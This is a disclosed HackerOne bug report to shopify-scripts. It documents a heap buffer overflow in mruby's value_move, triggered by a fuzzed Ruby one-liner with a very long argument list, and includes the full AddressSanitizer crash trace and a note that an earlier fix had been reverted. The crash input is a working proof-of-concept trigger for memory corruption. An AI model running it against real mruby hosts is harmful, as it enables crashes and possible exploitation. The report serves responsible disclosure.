# Heap buffer overflow in mruby value_move

## Report Details
- **Report ID**: 209765
- **URL**: https://hackerone.com/reports/209765
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-03-01T04:28:58.927Z
- **Disclosed**: 2017-04-13T21:11:49.474Z

## Reporter
- **Username**: sukhoi
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
Hi:

The following program demonstrates heap overflow on current up-to-date master branch mruby at the time of report, `Latest commit 8b089c0`

Program lead to crash is 
```
d 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 < 0 - 0.-- 1
```
ASAN stacktrace:
```
➜  mrubyfuzz ./mruby ./testcase.rb
=================================================================
==34183==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x61d00001e880 at pc 0x0000004a33ad bp 0x7ffcfe3e1bd0 sp 0x7ffcfe3e1380
WRITE of size 16 at 0x61d00001e880 thread T0
    #0 0x4a33ac in __asan_memcpy (/media/hdd/mrubyfuzz/mruby+0x4a33ac)
    #1 0x58e729 in value_move /media/hdd/mruby/src/value_array.h:14:15
    #2 0x58e729 in mrb_vm_exec /media/hdd/mruby/src/vm.c:1200
    #3 0x59f2fa in mrb_vm_run /media/hdd/mruby/src/vm.c:815:10
    #4 0x59f2fa in mrb_top_run /media/hdd/mruby/src/vm.c:2573
    #5 0x60f364 in mrb_load_exec /media/hdd/mruby/mrbgems/mruby-compiler/core/parse.y:5759:7
    #6 0x4ebafd in main /media/hdd/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232:11
    #7 0x7fea8386182f in __libc_start_main /build/glibc-Qz8a69/glibc-2.23/csu/../csu/libc-start.c:291
    #8 0x419578 in _start (/media/hdd/mrubyfuzz/mruby+0x419578)

0x61d00001e880 is located 0 bytes to the right of 2048-byte region [0x61d00001e080,0x61d00001e880)
allocated by thread T0 here:
    #0 0x4b9a28 in realloc (/media/hdd/mrubyfuzz/mruby+0x4b9a28)
    #1 0x54c1bd in mrb_default_allocf /media/hdd/mruby/src/state.c:60:12

SUMMARY: AddressSanitizer: heap-buffer-overflow (/media/hdd/mrubyfuzz/mruby+0x4a33ac) in __asan_memcpy
Shadow bytes around the buggy address:
  0x0c3a7fffbcc0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c3a7fffbcd0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c3a7fffbce0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c3a7fffbcf0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c3a7fffbd00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x0c3a7fffbd10:[fa]fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c3a7fffbd20: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c3a7fffbd30: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c3a7fffbd40: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c3a7fffbd50: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c3a7fffbd60: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Heap right redzone:      fb
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack partial redzone:   f4
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==34183==ABORTING
```
I did a brief search and find my fuzzing finding was very similar to `https://hackerone.com/reports/204421`, which is supposed to be fixed in `https://github.com/mruby/mruby/commit/f198530444f4b5ebfd011c3287114951c8553e5e`. However, `https://github.com/mruby/mruby/commit/736be0e98b9e1136a4dc7cb2dd05e1f33728f767#diff-86406329889f2c13524766839f0a96b3` reverted that fix, making the bug present again on current top master branch. So I'm reporting here again as a new issue.

Thanks!

## Attachments
No attachments
